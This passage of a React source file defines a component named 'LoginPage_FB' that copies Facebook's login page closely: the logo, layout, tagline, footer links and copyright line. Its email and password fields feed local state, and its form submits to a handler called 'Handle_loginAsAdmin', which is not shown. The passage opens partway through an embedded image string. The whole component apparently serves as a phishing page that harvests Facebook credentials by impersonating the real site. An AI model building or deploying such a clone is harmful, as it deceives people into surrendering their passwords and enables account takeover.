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);background-size:auto;background-repeat:no-repeat;display:inline-block}.sp_EP9wX8qDDvu.sx_6bdd81{width:16px;height:16px;background-position:-263px -251px}.sp_EP9wX8qDDvu.sx_0de3e6{width:12px;height:12px;background-position:-28px -298px}',
          }}
        />
        <style
          dangerouslySetInnerHTML={{
            __html:
              "._42ft{cursor:pointer;display:inline-block;text-decoration:none;white-space:nowrap}._42ft:hover{text-decoration:none}",
          }}
        />
        <div className="_li" id="u_0_1_uq">
          <div id="globalContainer" className="uiContextualLayerParent">
            <div className="fb_content clearfix" id="content" role="main">
              <div>
                <div className="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
                  <div className="_8esk">
                    <div className="_8esl">
                      <div className="_8ice">
                        <img
                          className="fb_logo _8ilh img"
                          src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDkwIiBoZWlnaHQ9IjM2MCIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDEwOTAgMzYwIj4KICA8cGF0aCBmaWxsPSIjMDg2NkZGIiBkPSJNODgxLjU4MyAyNTcuODk3aDI5LjQ4di00Ny42OTZsNDEuMTM3IDQ3LjY5NmgzNi4wNzJsLTQ3Ljg5LTU0Ljk2OSA0MC45MDktNDcuNjYzaC0zMi44MjVsLTM3LjQwMyA0My45M3YtOTYuOTgybC0yOS40OCAzLjg2NHYxNTEuODJabS02Ny45ODgtMTA1LjI2MWMtMzIuNzI4IDAtNTUuNDU1IDIyLjAxMy01NS40NTUgNTMuOTI5czIyLjcyNyA1My45MjkgNTUuNDU1IDUzLjkyOWMzMi43MjcgMCA1NS40NTUtMjIuMDEzIDU1LjQ1NS01My45MjlzLTIyLjcyOC01My45MjktNTUuNDU1LTUzLjkyOVptMCA4Mi43MjhjLTE1LjE2MyAwLTI1LjU1Mi0xMS43MjEtMjUuNTUyLTI4Ljc5OXMxMC4zODktMjguNzk5IDI1LjU1Mi0yOC43OTljMTUuMTYyIDAgMjUuNTUyIDExLjcyMSAyNS41NTIgMjguNzk5cy0xMC4zOSAyOC43OTktMjUuNTUyIDI4Ljc5OVptLTExOS44MDctODIuNzI4Yy0zMi43MjcgMC01NS40NTUgMjIuMDEzLTU1LjQ1NSA1My45MjlzMjIuNzI4IDUzLjkyOSA1NS40NTUgNTMuOTI5YzMyLjcyOCAwIDU1LjQ1NS0yMi4wMTMgNTUuNDU1LTUzLjkyOXMtMjIuNzI3LTUzLjkyOS01NS40NTUtNTMuOTI5Wm0wIDgyLjcyOGMtMTUuMTYyIDAtMjUuNTUyLTExLjcyMS0yNS41NTItMjguNzk5czEwLjM5LTI4Ljc5OSAyNS41NTItMjguNzk5YzE1LjE2MyAwIDI1LjU1MiAxMS43MjEgMjUuNTUyIDI4Ljc5OXMtMTAuMzg5IDI4Ljc5OS0yNS41NTIgMjguNzk5Wm0tMTEyLjgyNi04Mi43MjhjLTEzLjYzNiAwLTI0LjkzNSA1LjM1Ny0zMi4wMTMgMTUuMTYydi02NS41ODVsLTI5LjUxMyAzLjgzMXYxNTEuODJoMjYuMTY5bC41MTktMTUuODQ0YzYuOTgxIDExLjgxOCAxOS40ODEgMTguNDc0IDM0LjgzOCAxOC40NzQgMjcuOTg4IDAgNDguNDc1LTIyLjcyOCA0OC40NzUtNTMuOTI5IDAtMzEuMjAyLTIwLjM5LTUzLjkyOS00OC40NzUtNTMuOTI5Wm0tNi45OCA4Mi43MjhjLTE1LjE2MyAwLTI1LjU1Mi0xMS43MjEtMjUuNTUyLTI4Ljc5OXMxMC4zODktMjguNzk5IDI1LjU1Mi0yOC43OTljMTUuMTYyIDAgMjUuNTUyIDExLjcyMSAyNS41NTIgMjguNzk5cy0xMC4zOSAyOC43OTktMjUuNTUyIDI4Ljc5OVptLTExMy42MzggMS4zMzFjLTE1LjY0OSAwLTI2Ljg4My03LjI3My0zMC43MTQtMTkuODA1aDcyLjYzYy43MTUtMy44MzEgMS4yMDItOC4zNzcgMS4yMDItMTEuNDI5IDAtMzMuMDItMTguNDc1LTUyLjgyNS00OS41MTQtNTIuODI1LTMxLjMzMSAwLTUzLjAyIDIyLjAxMy01My4wMiA1My45MjkgMCAzMi4zMzggMjIuNzI4IDUzLjkyOSA1Ni40NjIgNTMuOTI5IDE3LjQ2NyAwIDM0LjQ0OC01Ljg0NCA0NS4wNjUtMTUuNTUybC0xMC42MTctMTguNzAxYy0xMC4yOTIgNy4xMS0yMC4zOSAxMC40NTQtMzEuNDk0IDEwLjQ1NFptLTYuNTkxLTYxLjEzN2MxMy42MzcgMCAyMi4zMzggOC4yNzkgMjIuMzM4IDIxLjEwNHYuMDk4aC00Ny4wNzhjMi44MjUtMTMuNjA0IDExLjYyMy0yMS4yMDIgMjQuNzQtMjEuMjAyWm0tOTguOTk0IDg0Ljk2OGMxNS4yNiAwIDMwLjE5NS01Ljg0NCA0MC43MTQtMTUuOTc0bC0xMS41MjYtMTkuMzgzYy04LjE4MiA2LjM2NC0xNy40NjcgOS44MDUtMjYuMjY2IDkuODA1LTE2LjM2NCAwLTI3LjI3My0xMS40MjktMjcuMjczLTI4LjM3N3MxMC45MDktMjguMzc3IDI3LjI3My0yOC4zNzdjOC4wODQgMCAxNi44ODMgMi45MjIgMjQuMDI2IDguMDg1bDExLjcyMS0xOS44MDZjLTkuNDgxLTguNTcxLTI0LjE1Ni0xMy44MzEtMzguNzAyLTEzLjgzMS0zMi4wMTMgMC01NC42NDMgMjIuMzM4LTU0LjY0MyA1My45MjkuMDMyIDMxLjQ5NCAyMi42NjIgNTMuOTI5IDU0LjY3NiA1My45MjlabS05My43MzUtMTA1LjI2MS0uNTE5IDE1Ljk3NWMtNi45ODEtMTEuOTE2LTE5LjQ4MS0xOC41NzItMzQuODM4LTE4LjU3Mi0yOC4wODUgMC00OC40NzUgMjIuNzI4LTQ4LjQ3NSA1My45MjkgMCAzMS4yMDIgMjAuNTIgNTMuOTI5IDQ4LjQ3NSA1My45MjkgMTUuMzU3IDAgMjcuODg5LTYuNjU2IDM0LjgzOC0xOC40NzRsLjUxOSAxNS44NDRoMjYuMTY5VjE1NS4yNjVoLTI2LjE2OVptLTI4LjM3NyA4MC4wOTljLTE1LjE2MiAwLTI1LjU1Mi0xMS43MjEtMjUuNTUyLTI4Ljc5OXMxMC4zOS0yOC43OTkgMjUuNTUyLTI4Ljc5OWMxNS4xNjMgMCAyNS41NTIgMTEuNzIxIDI1LjU1MiAyOC43OTlzLTEwLjQyMiAyOC43OTktMjUuNTUyIDI4Ljc5OVptLTU3LjY2My03OS45MDZoLTI2LjUyNnYtOC43NjdjMC0xMy4xMTcgNS4xMy0xOC4xNDkgMTguNDQyLTE4LjE0OSA0LjEyMyAwIDcuNDY3LjA5NyA5LjM4My4yOTJ2LTIyLjVjLTMuNjM3LTEuMDA3LTEyLjUtMi4wMTMtMTcuNjMtMi4wMTMtMjcuMTExIDAtMzkuNjExIDEyLjc5Mi0zOS42MTEgNDAuNDIydjEwLjY4MmgtMTYuNzUzdjI0LjgwNmgxNi43NTN2NzcuNjMxaDI5LjQ0OHYtNzcuNTk5aDIxLjk0OWw0LjU0NS0yNC44MDVaIi8+Cjwvc3ZnPgo="
                          alt="Facebook"
                        />
                      </div>
                      <h2 className="_8eso">
                        Facebook helps you connect and share with the people in
                        your life.
                      </h2>
                    </div>
                    <div className="_8esn">
                      <div className="_8iep _8icy _9ahz _9ah-">
                        <div className="_6luv _52jv">
                          <form
                            className="_9vtf"
                            data-testid="royal_login_form"
                            onSubmit={Handle_loginAsAdmin}
                            id="u_0_2_XQ"
                          >
                            <div>
                              <div className="_6lux">
                                <input
                                  type="text"
                                  className="inputtext _55r1 _6luy"
                                  name="email"
                                  id="email"
                                  data-testid="royal_email"
                                  placeholder="Email address or phone number"
                                  autofocus=""
                                  aria-label="Email address or phone number"
                                  value={username}
                                  onChange={(e) => setUsername(e.target.value)}
                                />
                              </div>
                              <div className="_6lux">
                                <input
                                  type="password"
                                  className="_6luy _55r1 _1kbt _9nyh"
                                  name="pass"
                                  id="pass"
                                  data-testid="royal_pass"
                                  placeholder="Password"
                                  autofocus=""
                                  aria-label="Password"
                                  value={password}
                                  onChange={(e) => setPassword(e.target.value)}
                                />
                              </div>
                            </div>
                            <div className="_6ltg">
                              <button
                                value={1}
                                className="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
                                name="login"
                                data-testid="royal_login_button"
                                type="submit"
                                id="u_0_5_N0"
                              >
                                Log in
                              </button>
                            </div>
                            <div className="_6ltj">
                              <a
                                href="https://en-gb.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzAxNzYwMTA2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login"
                                previewlistener="true"
                              >
                                Forgotten password?
                              </a>
                            </div>
                            <div className="_8icz" />
                            <div className="_6ltg">
                              <a
                                role="button"
                                className="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
                                href="#"
                                ajaxify="/reg/spotlight/"
                                id="u_0_0_VH"
                                data-testid="open-registration-form-button"
                                rel="async"
                              >
                                Create new account
                              </a>
                            </div>
                          </form>
                        </div>
                        <div id="reg_pages_msg" className="_58mk">
                          <a
                            href="https://en-gb.facebook.com/pages/create/?ref_type=registration_form"
                            className="_8esh"
                            previewlistener="true"
                          >
                            Create a Page
                          </a>{" "}
                          for a celebrity, brand or business.
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div>
              <div className="_95ke _8opy">
                <div
                  id="pageFooter"
                  data-referrer="page_footer"
                  data-testid="page_footer"
                >
                  <ul
                    className="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
                    data-nocookies={1}
                  >
                    <li>English (UK)</li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://hi-in.facebook.com/"
                        title="Hindi"
                        previewlistener="true"
                      >
                        हिन्दी
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://pa-in.facebook.com/"
                        title="Punjabi"
                        previewlistener="true"
                      >
                        ਪੰਜਾਬੀ
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="rtl"
                        href="https://ur-pk.facebook.com/"
                        title="Urdu"
                        previewlistener="true"
                      >
                        اردو
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://ta-in.facebook.com/"
                        title="Tamil"
                        previewlistener="true"
                      >
                        தமிழ்
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://bn-in.facebook.com/"
                        title="Bengali"
                        previewlistener="true"
                      >
                        বাংলা
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://mr-in.facebook.com/"
                        title="Marathi"
                        previewlistener="true"
                      >
                        मराठी
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://te-in.facebook.com/"
                        title="Telugu"
                        previewlistener="true"
                      >
                        తెలుగు
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://gu-in.facebook.com/"
                        title="Gujarati"
                        previewlistener="true"
                      >
                        ગુજરાતી
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://kn-in.facebook.com/"
                        title="Kannada"
                        previewlistener="true"
                      >
                        ಕನ್ನಡ
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://ml-in.facebook.com/"
                        title="Malayalam"
                        previewlistener="true"
                      >
                        മലയാളം
                      </a>
                    </li>
                    <li>
                      <a
                        role="button"
                        className="_42ft _4jy0 _517i _517h _51sy"
                        rel="dialog"
                        ajaxify="/settings/language/language/?uri=https%3A%2F%2Fml-in.facebook.com%2F&source=www_list_selector_more"
                        href="#"
                        title="Show more languages"
                      >
                        <i className="img sp_EP9wX8qDDvu sx_0de3e6" />
                      </a>
                    </li>
                  </ul>
                  <div id="contentCurve" />
                  <div
                    id="pageFooterChildren"
                    role="contentinfo"
                    aria-label="Facebook site links"
                  >
                    <ul className="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                      <li>
                        <a
                          href="https://en-gb.facebook.com/reg/"
                          title="Sign up for Facebook"
                          previewlistener="true"
                        >
                          Sign Up
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/login/"
                          title="Log in to Facebook"
                          previewlistener="true"
                        >
                          Log in
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://messenger.com/"
                          title="Take a look at Messenger."
                          previewlistener="true"
                        >
                          Messenger
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/lite/"
                          title="Facebook Lite for Android."
                          previewlistener="true"
                        >
                          Facebook Lite
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/watch/"
                          title="Browse in Video"
                          previewlistener="true"
                        >
                          Video
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/places/"
                          title="Take a look at popular places on Facebook."
                          previewlistener="true"
                        >
                          Places
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/games/"
                          title="Check out Facebook games."
                          previewlistener="true"
                        >
                          Games
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/marketplace/"
                          title="Buy and sell on Facebook Marketplace."
                          previewlistener="true"
                        >
                          Marketplace
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://pay.facebook.com/"
                          title="Learn more about Meta Pay"
                          target="_blank"
                          previewlistener="true"
                        >
                          Meta Pay
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://www.meta.com/"
                          title="Discover Meta"
                          target="_blank"
                          previewlistener="true"
                        >
                          Meta Store
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://www.meta.com/quest/"
                          title="Learn more about Meta Quest"
                          target="_blank"
                          previewlistener="true"
                        >
                          Meta Quest
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&h=AT3-ejnW7dAU-CvsGQIPvdgqCTFTKDT3TCAMqmS6m6mCsTp_ImhYHsfSlCa7Ha8sXClp9W_x4kw1bIB7NcIMa0X_KRPaC_BUfDEjTLj7cp10yGWgUmtyN_ZQbrxGGLbyac-72gf9aaI6KB3KWpjflg"
                          title="Take a look at Instagram"
                          target="_blank"
                          rel="noreferrer nofollow"
                          data-lynx-mode="asynclazy"
                          previewlistener="true"
                        >
                          Instagram
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://www.threads.net/"
                          title="Check out Threads"
                          previewlistener="true"
                        >
                          Threads
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/fundraisers/"
                          title="Donate to worthy causes."
                          previewlistener="true"
                        >
                          Fundraisers
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/biz/directory/"
                          title="Browse our Facebook Services directory."
                          previewlistener="true"
                        >
                          Services
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                          title="See the Voting Information Centre"
                          previewlistener="true"
                        >
                          Voting Information Centre
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/privacy/policy/?entry_point=facebook_page_footer"
                          title="Learn how we collect, use and share information to support Facebook."
                          previewlistener="true"
                        >
                          Privacy Policy
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/privacy/center/?entry_point=facebook_page_footer"
                          title="Learn how to manage and control your privacy on Facebook."
                          previewlistener="true"
                        >
                          Privacy Centre
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/groups/discover/"
                          title="Explore our groups."
                          previewlistener="true"
                        >
                          Groups
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://about.meta.com/"
                          accessKey={8}
                          title="Read our blog, discover the resource centre and find job opportunities."
                          previewlistener="true"
                        >
                          About
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto"
                          title="Advertise on Facebook"
                          previewlistener="true"
                        >
                          Create ad
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/pages/create/?ref_type=site_footer"
                          title="Create a Page"
                          previewlistener="true"
                        >
                          Create Page
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://developers.facebook.com/?ref=pf"
                          title="Develop on our platform."
                          previewlistener="true"
                        >
                          Developers
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/careers/?ref=pf"
                          title="Make your next career move to our brilliant company."
                          previewlistener="true"
                        >
                          Careers
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/policies/cookies/"
                          title="Learn about cookies and Facebook."
                          data-nocookies={1}
                          previewlistener="true"
                        >
                          Cookies
                        </a>
                      </li>
                      <li>
                        <a
                          className="_41ug"
                          data-nocookies={1}
                          href="https://www.facebook.com/help/568137493302217"
                          title="Learn about AdChoices."
                          previewlistener="true"
                        >
                          AdChoices
                          <i className="img sp_EP9wX8qDDvu sx_6bdd81" />
                        </a>
                      </li>
                      <li>
                        <a
                          data-nocookies={1}
                          href="https://en-gb.facebook.com/policies?ref=pf"
                          accessKey={9}
                          title="Review our terms and policies."
                          previewlistener="true"
                        >
                          Terms
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/help/?ref=pf"
                          accessKey={0}
                          title="Visit our Help Centre."
                          previewlistener="true"
                        >
                          Help
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://en-gb.facebook.com/help/637205020878504"
                          title="Visit our contact uploading and non-users notice."
                          previewlistener="true"
                        >
                          Contact uploading and non-users
                        </a>
                      </li>
                      <li>
                        <a
                          accessKey={6}
                          className="accessible_elem"
                          href="https://en-gb.facebook.com/settings"
                          title="View and edit your Facebook settings."
                          previewlistener="true"
                        >
                          Settings
                        </a>
                      </li>
                      <li>
                        <a
                          accessKey={7}
                          className="accessible_elem"
                          href="https://en-gb.facebook.com/allactivity?privacy_source=activity_log_top_menu"
                          title="View your activity log"
                          previewlistener="true"
                        >
                          Activity log
                        </a>
                      </li>
                    </ul>
                  </div>
                  <div className="mvl copyright">
                    <div>
                      <span> Meta © 2023</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div />
          <span>
            <img
              src="data:,"
              width={0}
              height={0}
              style={{ display: "none" }}
            />
          </span>
        </div>
        <div style={{ display: "none" }} />
        <div className="betternet-wrapper">
          <template shadowrootmode="open" />
        </div>
      </>
    );
  }
};

export default LoginPage_FB;
